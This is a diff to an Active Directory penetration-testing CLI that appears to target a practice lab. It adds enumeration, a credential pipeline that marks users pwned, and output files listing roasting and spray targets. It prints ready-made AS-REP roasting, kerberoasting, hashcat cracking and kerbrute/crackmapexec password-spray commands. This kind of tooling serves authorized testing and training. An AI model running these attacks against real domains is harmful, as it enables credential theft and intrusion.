@@ -3,6 +3,16 @@
 BloodHound Trail - Command Line Interface
 
 Usage:
+    # Auto-enumerate mode (target IP)
+    crack bloodtrail 10.10.10.161              # Anonymous enumeration
+    crack bloodtrail 10.10.10.161 -u user -p x # With credentials
+
+    # Credential integration pipeline (bridges enumerate + BloodHound)
+    crack bloodtrail 10.10.10.161 --creds svc-alfresco:s3rvice
+    crack bloodtrail 10.10.10.161 --creds ./creds.txt
+    crack bloodtrail 10.10.10.161 --use-potfile  # Auto-detect hashcat/john
+    crack bloodtrail 10.10.10.161 --creds user:pass --no-collect  # Skip BH
+
     # Edge enhancement (directory or ZIP file)
     crack bloodtrail /path/to/bh/json/
     crack bloodtrail /path/to/sharphound_output.zip
@@ -24,8 +34,11 @@ Credentials (defaults):
 
 import argparse
 import getpass
+import ipaddress
 import json
 import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from enum import Enum
 from pathlib import Path
 
 from neo4j import GraphDatabase
@@ -55,6 +68,48 @@ from .display_commands import (
     print_post_exploit_commands,
     print_machines_ip_table,
 )
+from .creds_pipeline import CredentialPipeline, PipelineOptions
+
+
+# ============================================================================
+# Input Mode Detection
+# ============================================================================
+
+class InputMode(Enum):
+    """Mode determined by input type"""
+    ENUMERATE = "enumerate"   # IP address -> run live enumeration
+    BLOODHOUND = "bloodhound" # Directory/ZIP -> parse BloodHound data
+
+
+def detect_input_mode(input_arg: str) -> tuple:
+    """
+    Detect mode based on input argument.
+
+    Returns:
+        (mode, normalized_input)
+
+    - IP address -> ENUMERATE mode
+    - Existing directory/ZIP -> BLOODHOUND mode
+    - Hostname with dots -> ENUMERATE mode
+    """
+    # Try IP address first (most specific)
+    try:
+        ipaddress.ip_address(input_arg)
+        return (InputMode.ENUMERATE, input_arg)
+    except ValueError:
+        pass
+
+    # Try as path
+    path = Path(input_arg)
+    if path.exists():
+        if path.is_dir() or path.suffix.lower() == '.zip':
+            return (InputMode.BLOODHOUND, str(path))
+
+    # Could be hostname for enumerate mode (e.g., dc.corp.local)
+    if '.' in input_arg and not path.exists():
+        return (InputMode.ENUMERATE, input_arg)
+
+    raise ValueError(f"Cannot determine mode for input: {input_arg}")
 
 
 def create_parser() -> argparse.ArgumentParser:
@@ -150,8 +205,9 @@ Supported Edge Types:
     )
     parser.add_argument(
         "--verbose", "-v",
-        action="store_true",
-        help="Print detailed progress",
+        action="count",
+        default=0,
+        help="Verbose output (-v for details, -vv to show commands)",
     )
     parser.add_argument(
         "--batch-size",
@@ -164,6 +220,32 @@ Supported Edge Types:
         type=str,
         metavar="IP",
         help="Set DC IP for DNS resolution and command auto-population. Can be used standalone (bt --dc-ip 192.168.50.70) or during import.",
+    )
+
+    # Enumerate mode credentials (for authenticated enumeration)
+    cred_group = parser.add_argument_group("Enumerate Mode Credentials")
+    cred_group.add_argument(
+        "-u", "--ad-username",
+        type=str,
+        metavar="USER",
+        help="AD username for authenticated enumeration (DOMAIN\\\\user or user@domain)",
+    )
+    cred_group.add_argument(
+        "-p", "--ad-password",
+        type=str,
+        metavar="PASS",
+        help="AD password for authenticated enumeration",
+    )
+    cred_group.add_argument(
+        "--domain",
+        type=str,
+        metavar="DOMAIN",
+        help="Domain name (auto-detected if not provided)",
+    )
+    cred_group.add_argument(
+        "--list-enumerators",
+        action="store_true",
+        help="List available enumeration tools and exit",
     )
 
     # Property import options (Kerberoasting, AS-REP, delegation detection)
@@ -543,6 +625,58 @@ Supported Edge Types:
         type=Path,
         metavar="DIR",
         help="Output directory for spray scripts/results (default: ./spray_output/)",
+    )
+
+    # Credential Integration Pipeline
+    creds_group = parser.add_argument_group("Credential Integration Pipeline")
+    creds_group.add_argument(
+        "--creds",
+        type=str,
+        metavar="CREDS",
+        help="Credential string (user:pass, domain/user:pass, user@domain:pass) or path to credentials file",
+    )
+    creds_group.add_argument(
+        "--creds-file",
+        type=Path,
+        metavar="FILE",
+        help="Path to credentials file (one per line: user:pass)",
+    )
+    creds_group.add_argument(
+        "--use-potfile",
+        action="store_true",
+        help="Auto-detect and use hashcat/john potfile",
+    )
+    creds_group.add_argument(
+        "--potfile-path",
+        type=Path,
+        metavar="FILE",
+        help="Custom potfile path",
+    )
+    creds_group.add_argument(
+        "--skip-validate",
+        action="store_true",
+        help="Skip credential validation (use if certain creds are valid)",
+    )
+    creds_group.add_argument(
+        "--no-collect",
+        action="store_true",
+        help="Skip BloodHound collection (use existing data)",
+    )
+    creds_group.add_argument(
+        "--no-pwn",
+        action="store_true",
+        help="Skip marking users as pwned",
+    )
+    creds_group.add_argument(
+        "--no-import",
+        action="store_true",
+        help="Skip Neo4j import of BloodHound data",
+    )
+    creds_group.add_argument(
+        "--bh-output",
+        type=Path,
+        metavar="DIR",
+        help="BloodHound output directory (default: ./bloodhound_output/)",
     )
 
     return parser
@@ -972,6 +1106,65 @@ def handle_run_all(args):
         runner.close()
 
     return 0 if stats["failed"] == 0 else 1
+
+
+def handle_creds_mode(args) -> int:
+    """
+    Handle --creds credential integration pipeline.
+
+    Pipeline stages:
+    1. Parse credentials from inline, file, or potfile
+    2. Validate credentials (kerbrute/crackmapexec)
+    3. Collect BloodHound data (bloodhound-python)
+    4. Import to Neo4j
+    5. Mark users as pwned
+    6. Query and display attack paths
+    """
+    # Build pipeline options from args
+    options = PipelineOptions(
+        skip_validate=getattr(args, 'skip_validate', False),
+        skip_collect=getattr(args, 'no_collect', False),
+        skip_pwn=getattr(args, 'no_pwn', False),
+        skip_import=getattr(args, 'no_import', False),
+        output_dir=getattr(args, 'bh_output', None),
+        verbose=getattr(args, 'verbose', 0),
+        domain=getattr(args, 'domain', None),
+    )
+
+    # Neo4j config
+    config = Neo4jConfig(uri=args.uri, user=args.user, password=args.password)
+
+    # Target IP is required (from bh_data_dir positional arg)
+    target = str(args.bh_data_dir) if args.bh_data_dir else None
+    if not target:
+        print("[!] Target IP required when using --creds")
+        print("    Usage: crack bloodtrail 10.10.10.161 --creds user:pass")
+        return 1
+
+    # Create and run pipeline
+    pipeline = CredentialPipeline(target, config, options)
+
+    result = pipeline.run(
+        inline_creds=getattr(args, 'creds', None),
+        creds_file=getattr(args, 'creds_file', None),
+        use_potfile=getattr(args, 'use_potfile', False),
+        potfile_path=getattr(args, 'potfile_path', None),
+    )
+
+    # Display summary
+    print()
+    if result.success:
+        print(f"[+] Pipeline completed successfully")
+        if result.credentials_valid:
+            print(f"    Valid credentials: {result.credentials_valid}")
+        if result.users_marked_pwned:
+            print(f"    Users marked pwned: {result.users_marked_pwned}")
+        if result.bloodhound_output_dir:
+            print(f"    BloodHound data: {result.bloodhound_output_dir}")
+    else:
+        print(f"[!] Pipeline failed: {result.error}")
+
+    return 0 if result.success else 1
 
 
 def handle_resume(args):
@@ -2357,9 +2550,573 @@ def _generate_spray_scripts(args, domain, dc_ip, users, passwords, lockout_mgr, 
     return 0
 
 
+# ============================================================================
+# Enumerate Mode Handler
+# ============================================================================
+
+def handle_list_enumerators():
+    """List available enumeration tools"""
+    from .enumerators import list_enumerators
+
+    print("\n[*] Available Enumeration Tools:\n")
+
+    for enum in list_enumerators():
+        status = "\033[92m[OK]\033[0m" if enum["available"] else "\033[91m[NOT INSTALLED]\033[0m"
+        anon = "anonymous" if enum["anonymous"] else "requires creds"
+        print(f"  {status} {enum['name']}")
+        print(f"       Tool: {enum['tool']} ({anon})")
+        print()
+
+    return 0
+
+
+# Patterns that suggest passwords in descriptions
+SUSPICIOUS_DESC_PATTERNS = ['pass', 'pwd', 'cred', 'secret', 'key', 'login', 'token']
+
+
+def _highlight_description(desc: str, red: str, reset: str) -> str:
+    """Highlight descriptions containing password hints."""
+    lower = desc.lower()
+    for pattern in SUSPICIOUS_DESC_PATTERNS:
+        if pattern in lower:
+            return f"{red}{desc}{reset}"
+    return desc
+
+
+def print_data_inventory(aggregated, target: str, verbose: bool = False):
+    """Print data inventory section (users, computers, groups, shares)."""
+    from .enumerators.aggregator import AggregatedResult
+
+    # Colors
+    C = "\033[96m"   # Cyan
+    G = "\033[92m"   # Green
+    Y = "\033[93m"   # Yellow
+    R = "\033[91m"   # Red
+    B = "\033[1m"    # Bold
+    D = "\033[2m"    # Dim
+    X = "\033[0m"    # Reset
+
+    print()
+    print(f"{C}{B}╔══════════════════════════════════════════════════════════════════════╗{X}")
+    print(f"{C}{B}║{X}   {Y}📊{X} {B}DATA INVENTORY{X}                                                 {C}{B}║{X}")
+    print(f"{C}{B}╚══════════════════════════════════════════════════════════════════════╝{X}")
+    print()
+
+    # Domain info
+    print(f"  {B}DOMAIN INFO{X}")
+    print(f"  {D}{'─' * 60}{X}")
+    print(f"    Domain:     {B}{aggregated.domain or 'Unknown'}{X}")
+    if aggregated.dc_hostname:
+        print(f"    DC:         {B}{aggregated.dc_hostname}{X} ({target})")
+    else:
+        print(f"    DC IP:      {B}{target}{X}")
+    print()
+
+    # Users with descriptions
+    enabled_users = [u for u in aggregated.users.values() if u.get('enabled', True)]
+    print(f"  {B}USERS ({len(enabled_users)} enabled){X}")
+    print(f"  {D}{'─' * 60}{X}")
+
+    # Sort by name
+    sorted_users = sorted(enabled_users, key=lambda u: u.get('name', '').lower())
+    display_limit = 30 if verbose >= 1 else 15
+
+    for user in sorted_users[:display_limit]:
+        name = user.get('name', 'unknown')
+        desc = user.get('description', '')
+
+        # Service account tag
+        svc_tag = f"{Y}[SVC]{X}" if user.get('is_service') else "     "
+
+        # Format description (truncate if needed)
+        if desc:
+            desc = desc[:40] + "..." if len(desc) > 40 else desc
+            desc = _highlight_description(desc, R, X)
+            print(f"    {svc_tag} {name:<20} {D}{desc}{X}")
+        else:
+            print(f"    {svc_tag} {name}")
+
+    if len(sorted_users) > display_limit:
+        print(f"    {D}... and {len(sorted_users) - display_limit} more (use -v for full list){X}")
+    print()
+
+    # Dangerous flags section
+    pwnotreq_users = [u for u in enabled_users if u.get('pwnotreq')]
+    pwnoexp_users = [u for u in enabled_users if u.get('pwnoexp')]
+    asrep_users = [u for u in enabled_users if u.get('asrep')]
+    spn_users = [u for u in enabled_users if u.get('spn')]
+
+    if pwnotreq_users or pwnoexp_users or asrep_users:
+        print(f"  {R}{B}⚠️  DANGEROUS FLAGS{X}")
+        print(f"  {D}{'─' * 60}{X}")
+
+        for user in asrep_users:
+            print(f"    {R}{user['name']:<20} [ASREP]    AS-REP roastable (no preauth){X}")
+
+        for user in pwnotreq_users:
+            print(f"    {R}{user['name']:<20} [PWNOTREQ] Password not required!{X}")
+
+        for user in pwnoexp_users[:5]:  # Limit these as often many
+            print(f"    {Y}{user['name']:<20} [PWNOEXP]  Password never expires{X}")
+
+        if len(pwnoexp_users) > 5:
+            print(f"    {D}... and {len(pwnoexp_users) - 5} more with PWNOEXP{X}")
+        print()
+
+    # Kerberoastable users
+    if spn_users:
+        print(f"  {Y}{B}KERBEROASTABLE USERS ({len(spn_users)}){X}")
+        print(f"  {D}{'─' * 60}{X}")
+        for user in spn_users[:10]:
+            spns = user.get('spns', [])
+            spn_str = spns[0] if spns else 'SPN set'
+            if len(spns) > 1:
+                spn_str += f" (+{len(spns)-1} more)"
+            print(f"    {Y}{user['name']:<20}{X} {D}{spn_str}{X}")
+        if len(spn_users) > 10:
+            print(f"    {D}... and {len(spn_users) - 10} more{X}")
+        print()
+
+    # Computers
+    if aggregated.computers:
+        print(f"  {B}COMPUTERS ({len(aggregated.computers)}){X}")
+        print(f"  {D}{'─' * 60}{X}")
+        sorted_computers = sorted(aggregated.computers.values(), key=lambda c: c.get('name', '').lower())
+        for comp in sorted_computers[:10]:
+            name = comp.get('name', 'unknown')
+            os_info = comp.get('os', '')
+            if os_info:
+                print(f"    {name:<16} {D}{os_info}{X}")
+            else:
+                print(f"    {name}")
+        if len(sorted_computers) > 10:
+            print(f"    {D}... and {len(sorted_computers) - 10} more{X}")
+        print()
+
+    # Groups (notable ones)
+    if aggregated.groups:
+        notable_groups = ['domain admins', 'enterprise admins', 'administrators',
+                         'account operators', 'backup operators', 'server operators',
+                         'exchange windows permissions', 'dnsadmins']
+        groups_list = list(aggregated.groups.values())
+        notable = [g for g in groups_list if g.get('name', '').lower() in notable_groups]
+        other_count = len(groups_list) - len(notable)
+
+        print(f"  {B}GROUPS ({len(groups_list)}) - Notable{X}")
+        print(f"  {D}{'─' * 60}{X}")
+        for group in notable:
+            print(f"    {group.get('name', 'unknown')}")
+        if other_count > 0:
+            print(f"    {D}... and {other_count} other groups{X}")
+        print()
+
+    # Shares
+    if aggregated.shares:
+        print(f"  {B}SHARES ({len(aggregated.shares)}){X}")
+        print(f"  {D}{'─' * 60}{X}")
+        for share in list(aggregated.shares.values())[:10]:
+            name = share.get('name', 'unknown')
+            stype = share.get('type', '')
+            print(f"    {name:<16} {D}({stype}){X}" if stype else f"    {name}")
+        print()
+
+    # Password Policy
+    if aggregated.password_policy:
+        policy = aggregated.password_policy
+        print(f"  {B}PASSWORD POLICY{X}")
+        print(f"  {D}{'─' * 60}{X}")
+        print(f"    Min Length:      {policy.get('min_length', 'N/A')}")
+
+        complexity = policy.get('complexity')
+        if complexity is not None:
+            print(f"    Complexity:      {'Enabled' if complexity else f'{R}DISABLED{X}'}")
+
+        lockout = policy.get('lockout_threshold', 0)
+        if lockout == 0:
+            print(f"    Lockout:         {R}None (unlimited spray!){X}")
+        else:
+            print(f"    Lockout:         {lockout} attempts")
+            window = policy.get('lockout_window', 30)
+            print(f"    Window:          {window} minutes")
+        print()
+
+
+def print_attack_commands(aggregated, target: str):
+    """Print attack command suggestions."""
+    # Colors
+    C = "\033[96m"   # Cyan
+    G = "\033[92m"   # Green
+    Y = "\033[93m"   # Yellow
+    R = "\033[91m"   # Red
+    B = "\033[1m"    # Bold
+    D = "\033[2m"    # Dim
+    X = "\033[0m"    # Reset
+
+    print()
+    print(f"{C}{B}╔══════════════════════════════════════════════════════════════════════╗{X}")
+    print(f"{C}{B}║{X}   {Y}🎯{X} {B}ATTACK COMMANDS{X}                                                {C}{B}║{X}")
+    print(f"{C}{B}╚══════════════════════════════════════════════════════════════════════╝{X}")
+    print()
+
+    domain_lower = (aggregated.domain or "DOMAIN").lower()
+    asrep_users = aggregated.asrep_roastable_users
+    spn_users = [u for u in aggregated.users.values() if u.get('spn') and u.get('enabled', True)]
+
+    # AS-REP Roasting
+    if asrep_users:
+        print(f"  {R}{B}AS-REP ROASTING ({len(asrep_users)} target{'s' if len(asrep_users) > 1 else ''}){X}")
+        print(f"  {D}{'─' * 60}{X}")
+        for user in asrep_users[:3]:
+            cmd = f"impacket-GetNPUsers -dc-ip {target} -request -no-pass {domain_lower}/{user['name']}"
+            print(f"  {G}{cmd}{X}")
+        print()
+        print(f"  {D}Post-success:{X}")
+        print(f"  {G}hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt{X}")
+        print()
+
+    # Kerberoasting
+    if spn_users:
+        print(f"  {Y}{B}KERBEROASTING ({len(spn_users)} target{'s' if len(spn_users) > 1 else ''}){X}")
+        print(f"  {D}{'─' * 60}{X}")
+        print(f"  {D}Requires valid credentials:{X}")
+        print(f"  {G}impacket-GetUserSPNs -dc-ip {target} {domain_lower}/USER:PASS -request{X}")
+        print()
+        print(f"  {D}Post-success:{X}")
+        print(f"  {G}hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt{X}")
+        print()
+
+    # Password Spray
+    policy = aggregated.password_policy
+    lockout = policy.get('lockout_threshold', 0) if policy else 0
+
+    print(f"  {B}PASSWORD SPRAY{X}")
+    print(f"  {D}{'─' * 60}{X}")
+
+    if lockout == 0:
+        print(f"  {R}WARNING: No lockout policy detected - spray with caution!{X}")
+    else:
+        safe = aggregated.spray_safe_attempts
+        window = policy.get('lockout_window', 30) if policy else 30
+        print(f"  {D}Safe attempts: {safe} per {window} min window{X}")
+
+    print()
+    print(f"  {D}# Kerbrute (Kerberos - stealthier):{X}")
+    print(f"  {G}kerbrute passwordspray -d {domain_lower} --dc {target} users.txt 'Password1'{X}")
+    print()
+    print(f"  {D}# CrackMapExec (SMB):{X}")
+    print(f"  {G}crackmapexec smb {target} -u users.txt -p 'Password1' --continue-on-success{X}")
+    print()
+
+    # Post-success actions
+    print(f"  {B}POST-SUCCESS{X}")
+    print(f"  {D}{'─' * 60}{X}")
+    print(f"  {D}# With valid creds, BloodHound collection:{X}")
+    print(f"  {G}bloodhound-python -d {domain_lower} -u USER -p PASS -c All -dc {target}{X}")
+    print()
+
+
+def generate_enum_files(aggregated, target: str, output_dir: str = None):
+    """Generate enumeration output files."""
+    import os
+
+    # Create output directory
+    if output_dir is None:
+        output_dir = f"./enum_{target.replace('.', '_')}"
+
+    os.makedirs(output_dir, exist_ok=True)
+
+    enabled_users = [u for u in aggregated.users.values() if u.get('enabled', True)]
+
+    # users_all.txt - all enabled users
+    with open(os.path.join(output_dir, "users_all.txt"), "w") as f:
+        for user in sorted(enabled_users, key=lambda u: u.get('name', '').lower()):
+            f.write(user.get('name', '') + "\n")
+
+    # users_real.txt - non-service accounts (for spray)
+    real_users = [u for u in enabled_users if not u.get('is_service')]
+    with open(os.path.join(output_dir, "users_real.txt"), "w") as f:
+        for user in sorted(real_users, key=lambda u: u.get('name', '').lower()):
+            f.write(user.get('name', '') + "\n")
+
+    # users_service.txt - service accounts
+    service_users = [u for u in enabled_users if u.get('is_service')]
+    with open(os.path.join(output_dir, "users_service.txt"), "w") as f:
+        for user in sorted(service_users, key=lambda u: u.get('name', '').lower()):
+            f.write(user.get('name', '') + "\n")
+
+    # asrep_targets.txt - AS-REP roastable
+    asrep_users = aggregated.asrep_roastable_users
+    with open(os.path.join(output_dir, "asrep_targets.txt"), "w") as f:
+        for user in asrep_users:
+            f.write(user.get('name', '') + "\n")
+
+    # kerberoast_targets.txt - users with SPNs
+    spn_users = [u for u in enabled_users if u.get('spn')]
+    with open(os.path.join(output_dir, "kerberoast_targets.txt"), "w") as f:
+        for user in spn_users:
+            f.write(user.get('name', '') + "\n")
+
+    # computers.txt - computer names
+    with open(os.path.join(output_dir, "computers.txt"), "w") as f:
+        for comp in sorted(aggregated.computers.values(), key=lambda c: c.get('name', '').lower()):
+            f.write(comp.get('name', '') + "\n")
+
+    # domain_info.txt - summary
+    with open(os.path.join(output_dir, "domain_info.txt"), "w") as f:
+        f.write(f"Domain: {aggregated.domain or 'Unknown'}\n")
+        f.write(f"DC IP: {aggregated.dc_ip or target}\n")
+        if aggregated.dc_hostname:
+            f.write(f"DC Hostname: {aggregated.dc_hostname}\n")
+        f.write(f"\n")
+        f.write(f"Users: {len(enabled_users)}\n")
+        f.write(f"  - AS-REP Roastable: {len(asrep_users)}\n")
+        f.write(f"  - Kerberoastable: {len(spn_users)}\n")
+        f.write(f"  - Service Accounts: {len(service_users)}\n")
+        f.write(f"Computers: {len(aggregated.computers)}\n")
+        f.write(f"Groups: {len(aggregated.groups)}\n")
+
+        if aggregated.password_policy:
+            policy = aggregated.password_policy
+            f.write(f"\nPassword Policy:\n")
+            f.write(f"  Min Length: {policy.get('min_length', 'N/A')}\n")
+            f.write(f"  Complexity: {'Enabled' if policy.get('complexity') else 'DISABLED'}\n")
+            lockout = policy.get('lockout_threshold', 0)
+            if lockout == 0:
+                f.write(f"  Lockout: None\n")
+            else:
+                f.write(f"  Lockout: {lockout} attempts\n")
+
+    return output_dir
+
+
+def run_enumerate_mode(
+    target: str,
+    username: str = None,
+    password: str = None,
+    domain: str = None,
+    verbose: bool = False,
+    show_commands: bool = False,
+    show_data: bool = False,
+):
+    """
+    Execute auto-enumeration mode.
+
+    1. Discover available enumerators
+    2. Run anonymous enumerators in parallel
+    3. Aggregate results
+    4. Display attack suggestions
+    """
+    from .enumerators import get_available_enumerators
+    from .enumerators.aggregator import aggregate_results
+
+    # Colors
+    C = "\033[96m"   # Cyan
+    G = "\033[92m"   # Green
+    Y = "\033[93m"   # Yellow
+    R = "\033[91m"   # Red
+    B = "\033[1m"    # Bold
+    D = "\033[2m"    # Dim
+    X = "\033[0m"    # Reset
+
+    print()
+    print(f"{C}{B}╔══════════════════════════════════════════════════════════════════════╗{X}")
+    print(f"{C}{B}║{X}   {Y}🔍{X} {B}BloodTrail Enumerate Mode{X} - Pre-Auth Attack Discovery         {C}{B}║{X}")
+    print(f"{C}{B}╚══════════════════════════════════════════════════════════════════════╝{X}")
+    print()
+    print(f"  {D}Target:{X}       {B}{target}{X}")
+
+    if username:
+        print(f"  {D}Username:{X}     {B}{username}{X}")
+        print(f"  {D}Auth level:{X}   {B}Authenticated{X}")
+    else:
+        print(f"  {D}Auth level:{X}   {B}Anonymous{X}")
+
+    print()
+
+    # Get available enumerators
+    enumerators = get_available_enumerators(
+        anonymous_only=not bool(username),
+        require_installed=True
+    )
+
+    if not enumerators:
+        print(f"{R}[!] No enumeration tools available.{X}")
+        print(f"    Install: enum4linux-ng, ldapsearch, or kerbrute")
+        return 1
+
+    # Print commands if very verbose (-vv)
+    if verbose >= 2:
+        print(f"[*] Commands to execute:")
+        print()
+
+        # Phase 1 enumerators
+        for i, enum in enumerate(enumerators, 1):
+            cmd, desc = enum.get_command(
+                target=target,
+                username=username,
+                password=password,
+                domain=domain,
+            )
+            if cmd:
+                print(f"  {i}. {' '.join(cmd)}")
+                print(f"     {D}- {desc}{X}")
+                print()
+
+        # Phase 2 preview (GetNPUsers) - runs after user discovery
+        from .enumerators.getnpusers import GetNPUsersEnumerator
+        getnp_preview = GetNPUsersEnumerator()
+        if getnp_preview.is_available():
+            cmd, desc = getnp_preview.get_command(
+                target=target,
+                domain=domain,
+                user_list=["<discovered>"],
+            )
+            print(f"  {len(enumerators) + 1}. {' '.join(cmd)}  {D}[Phase 2]{X}")
+            print(f"     {D}- {desc}{X}")
+            print()
+
+    print(f"[*] Running {len(enumerators)} enumerator(s)...")
+    print()
+
+    # Run in parallel
+    results = []
+    try:
+        with ThreadPoolExecutor(max_workers=4) as executor:
+            futures = {
+                executor.submit(
+                    enum.run,
+                    target=target,
+                    username=username,
+                    password=password,
+                    timeout=300,
+                    domain=domain,  # Pass domain to enumerators (kerbrute needs this)
+                ): enum
+                for enum in enumerators
+            }
+
+            for future in as_completed(futures):
+                enum = futures[future]
+                try:
+                    result = future.result()
+                    results.append(result)
+
+                    if result.success:
+                        print(f"  {G}[OK]{X} {enum.name}: {result.duration_seconds:.1f}s")
+                        if verbose >= 1 and result.users:
+                            print(f"       Found {len(result.users)} users")
+                    else:
+                        print(f"  {R}[FAIL]{X} {enum.name}: {result.error or 'Unknown error'}")
+
+                except Exception as e:
+                    print(f"  {R}[ERR]{X} {enum.name}: {e}")
+    except KeyboardInterrupt:
+        print(f"\n  {Y}[!] Interrupted - cancelling enumeration{X}")
+        return 1
+
+    # Aggregate results
+    print()
+    aggregated = aggregate_results(results)
+
+    # Use provided domain or detected
+    if domain:
+        aggregated.domain = domain.upper()
+
+    # Debug: Show AS-REP users found in Phase 1
+    if verbose >= 2:
+        asrep_users = [u["name"] for u in aggregated.users.values() if u.get("asrep")]
+        if asrep_users:
+            print(f"  {D}[Phase 1] Found {len(asrep_users)} AS-REP users: {asrep_users}{X}")
+        else:
+            print(f"  {D}[Phase 1] No AS-REP users detected yet (will check in Phase 2){X}")
+        print()
+
+    # Phase 2: Run GetNPUsers AS-REP check with discovered users
+    discovered_users = [u["name"] for u in aggregated.users.values()]
+    has_asrep = any(u.get("asrep") for u in aggregated.users.values())
+
+    if discovered_users and not has_asrep:
+        from .enumerators.getnpusers import GetNPUsersEnumerator
+
+        getnp = GetNPUsersEnumerator()
+        if getnp.is_available():
+            print(f"[*] Phase 2: Testing {len(discovered_users)} users for AS-REP...")
+
+            # Print command if very verbose (-vv)
+            if verbose >= 2:
+                cmd, desc = getnp.get_command(
+                    target=target,
+                    domain=aggregated.domain or domain,
+                    user_list=discovered_users,
+                )
+                print(f"    {' '.join(cmd)}")
+                print(f"    {D}- {desc}{X}")
+            print()
+
+            asrep_result = getnp.run(
+                target=target,
+                domain=aggregated.domain or domain,
+                user_list=discovered_users,
+                timeout=120,
+            )
+
+            if asrep_result.success:
+                asrep_found = [u for u in asrep_result.users if u.get("asrep")]
+                if asrep_found:
+                    print(f"  {G}[OK]{X} GetNPUsers AS-REP: {asrep_result.duration_seconds:.1f}s")
+                    print(f"       Found {len(asrep_found)} AS-REP roastable user(s)")
+
+                    # Merge AS-REP results into aggregated
+                    for user in asrep_result.users:
+                        key = user["name"].lower()
+                        if key in aggregated.users:
+                            aggregated.users[key]["asrep"] = user.get("asrep", False)
+                            if user.get("asrep_hash"):
+                                aggregated.users[key]["asrep_hash"] = user["asrep_hash"]
+                        elif user.get("asrep"):
+                            # User not in list but AS-REP roastable - add them
+                            aggregated.users[key] = user
+                else:
+                    print(f"  {D}[OK]{X} GetNPUsers AS-REP: No vulnerable users")
+            else:
+                print(f"  {Y}[SKIP]{X} GetNPUsers: {asrep_result.error or 'Failed'}")
+
+            print()
+
+    # Display control logic (following -d/-c patterns from main module)
+    show_all = not show_commands and not show_data
+
+    # Quick summary (always shown)
+    print(f"  {D}Domain:{X}       {B}{aggregated.domain or 'Unknown'}{X}")
+    print(f"  {D}Users:{X}        {B}{len(aggregated.users)}{X}")
+    print(f"  {D}Computers:{X}    {B}{len(aggregated.computers)}{X}")
+    print(f"  {D}Groups:{X}       {B}{len(aggregated.groups)}{X}")
+
+    # Display data inventory
+    if show_all or show_data:
+        print_data_inventory(aggregated, target, verbose)
+
+    # Display attack commands
+    if show_all or show_commands:
+        print_attack_commands(aggregated, target)
+
+    # Always generate files
+    output_dir = generate_enum_files(aggregated, target)
+    print(f"  {D}Files saved to:{X} {B}{output_dir}/{X}")
+    print()
+
+    print(f"{C}{'═' * 74}{X}")
+    print()
+
+    return 0
+
+
 def main():
     parser = create_parser()
     args = parser.parse_args()
+
+    # Handle --list-enumerators
+    if args.list_enumerators:
+        return handle_list_enumerators()
 
     # Handle --list-edges
     if args.list_edges:
@@ -2498,14 +3255,39 @@ def main():
     if args.auto_spray:
         return handle_auto_spray(args)
 
+    # Handle --creds credential integration pipeline
+    # This bridges enumerate mode and BloodHound mode
+    if getattr(args, 'creds', None) or getattr(args, 'creds_file', None) or getattr(args, 'use_potfile', False):
+        return handle_creds_mode(args)
+
     # Handle --dc-ip as standalone config setter (when no data directory provided)
     if args.dc_ip and (not hasattr(args, 'bh_data_dir') or args.bh_data_dir is None):
         return handle_dc_ip_standalone(args)
 
-    # Edge enhancement requires bh_data_dir
+    # Check if input is provided
     if not hasattr(args, 'bh_data_dir') or args.bh_data_dir is None:
         parser.print_help()
         return 0
+
+    # Detect input mode: IP -> enumerate, path -> BloodHound
+    try:
+        mode, target = detect_input_mode(str(args.bh_data_dir))
+
+        if mode == InputMode.ENUMERATE:
+            # Run enumerate mode
+            return run_enumerate_mode(
+                target=target,
+                username=getattr(args, 'ad_username', None),
+                password=getattr(args, 'ad_password', None),
+                domain=getattr(args, 'domain', None),
+                verbose=args.verbose,
+                show_commands=getattr(args, 'commands', False),
+                show_data=getattr(args, 'data', False),
+            )
+        # else: BLOODHOUND mode - continue with existing logic
+    except ValueError:
+        # Not a valid IP or path - let original validation handle it
+        pass
 
     # Validate data source (directory or ZIP file)
     is_valid, message = is_valid_bloodhound_source(args.bh_data_dir)
